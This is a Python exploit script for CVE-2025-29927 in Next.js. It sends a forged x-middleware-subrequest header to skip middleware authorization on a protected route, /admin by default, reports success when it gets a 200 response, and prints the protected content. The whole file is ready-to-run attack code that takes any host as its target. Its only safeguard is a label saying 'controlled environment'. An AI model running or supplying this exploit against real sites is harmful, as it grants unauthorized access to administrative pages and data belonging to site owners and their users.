#!/usr/bin/env python3
import requests
import argparse
import sys

def exploit_nextjs(host, path="/admin", scheme="http",
                    header_value="middleware:middleware:middleware:middleware:middleware",
                    verbose=False):
    """
    Attempts to bypass Next.js middleware using the x-middleware-subrequest header.
    
    Parameters:
      - host: domain/host with port (e.g., localhost:3000)
      - path: protected route (default: /admin)
      - scheme: 'http' or 'https'
      - header_value: header value used to bypass the middleware
      - verbose: enables detailed debugging information
    """
    headers = {
        "x-middleware-subrequest": header_value,
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
    }
    url = f"{scheme}://{host}{path}"
    
    if verbose:
        print(f"[DEBUG] Target URL: {url}")
        print(f"[DEBUG] Headers used: {headers}")
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if verbose:
            print(f"[DEBUG] Response status code: {response.status_code}")
            print(f"[DEBUG] Response headers: {response.headers}")
        if response.status_code == 200:
            print(f"[+] Exploit successful! Access to {url} granted")
            snippet = response.text[:500] if len(response.text) > 500 else response.text
            print(f"Response (snippet):\n{snippet}\n")
        else:
            print(f"[-] Exploit failed. Status code: {response.status_code}")
            if verbose:
                print(f"[DEBUG] Full response:\n{response.text}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Request error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Exploit for CVE-2025-29927 in Next.js (Controlled Environment)"
    )
    parser.add_argument("--host", required=True,
                        help="Vulnerable application host (e.g., localhost:3000)")
    parser.add_argument("--path", default="/admin",
                        help="Protected route path (default: /admin)")
    parser.add_argument("--scheme", choices=["http", "https"], default="http",
                        help="Protocol to use (http or https)")
    parser.add_argument("--header", default="middleware:middleware:middleware:middleware:middleware",
                        help="Value for the x-middleware-subrequest header")
    parser.add_argument("--verbose", action="store_true",
                        help="Display detailed debugging information")
    args = parser.parse_args()
    
    print("=== CVE-2025-29927 Exploit ===")
    print("Starting attack in a controlled environment...\n")
    exploit_nextjs(args.host, args.path, args.scheme, args.header, args.verbose)
